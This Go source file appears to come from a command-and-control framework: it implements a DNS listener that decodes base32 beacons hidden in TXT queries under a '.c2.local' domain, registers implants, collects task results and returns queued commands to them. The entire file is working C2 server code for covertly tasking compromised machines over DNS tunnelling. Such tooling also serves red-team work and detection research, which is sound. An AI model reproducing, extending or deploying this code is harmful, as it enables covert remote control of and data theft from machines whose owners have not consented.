package listeners

import (
	"encoding/base32"
	"fmt"
	"strings"
	"suigetsu/server/beacon"
	"github.com/miekg/dns"
)

type DNSHandler struct {
	manager *Manager
}

func (h *DNSHandler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Authoritative = true
	switch r.Question[0].Qtype {
	case dns.TypeTXT:
		name := r.Question[0].Name
		name = strings.TrimSuffix(name, ".")
		lowerName := strings.ToLower(name)
		if idx := strings.LastIndex(lowerName, ".c2.local"); idx != -1 {
			name = name[:idx]
		}
		name = strings.ReplaceAll(name, ".", "")
		name = strings.ToUpper(strings.TrimRight(name, "="))

		decoded, err := base32.StdEncoding.WithPadding(base32.NoPadding).DecodeString(name)
		if err != nil {
			fmt.Println("Error decoding base32:", err)
			return
		}
		b, err := h.manager.Receiver.Process(decoded)
		if err != nil {
			fmt.Println("beacon verification failed:", err)
			return
		}
		implantID := fmt.Sprintf("%x", b.ImplantID)

		if b.Type == beacon.TypeCheckin {
			h.manager.Queue.RegisterImplant(implantID, string(b.Data))
		}
		if b.Type == beacon.TypeResult {
			h.manager.Queue.CompleteTask(implantID, string(b.Data))
		}

		h.manager.Queue.UpdateLastSeen(implantID)
		task, err := h.manager.Queue.GetNextTask(implantID)
		if err != nil {
			task = "noop"
		}
		encoded := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString([]byte(task))
		m.Answer = append(m.Answer, &dns.TXT{
			Hdr: dns.RR_Header{
				Name:   r.Question[0].Name,
				Rrtype: dns.TypeTXT,
				Class:  dns.ClassINET,
				Ttl:    0,
			},
			Txt: []string{encoded},
		})
	}
	w.WriteMsg(m)
}

func (m *Manager) StartDNS() {
	m.mu.Lock()
	if m.activeDNS != nil {
		m.mu.Unlock()
		return
	}
	handler := &DNSHandler{manager: m}
	server := &dns.Server{Addr: ":53", Net: "udp", Handler: handler}
	m.activeDNS = server
	m.mu.Unlock()

	go func() {
		if err := server.ListenAndServe(); err != nil {
			fmt.Printf("DNS listener stopped: %v\n", err)
		}
	}()
}

func (m *Manager) StopDNS() {
	m.mu.Lock()
	defer m.mu.Unlock()
	if m.activeDNS != nil {
		m.activeDNS.Shutdown()
		m.activeDNS = nil
	}
}